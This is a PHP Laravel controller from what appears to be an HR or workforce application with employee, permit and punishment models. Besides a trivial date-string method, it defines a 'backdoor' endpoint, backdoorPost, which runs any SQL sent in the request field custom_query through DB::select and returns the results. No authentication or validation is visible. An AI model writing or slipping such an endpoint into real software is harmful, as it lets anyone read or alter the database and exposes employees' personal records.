<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\ExamSystem\ExamSystemApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Models\Employee;
use App\Models\Permit;
use App\Models\Punishment;
use App\Models\RecruitingStep;
use App\Models\Shift;
use App\Services\PermitService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $date = '21 Nisan 2021';
        $string = '#date# Tarihinde Randevunuz Bulunmaktadır';

        return str_replace('#date#', $date, $string);
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
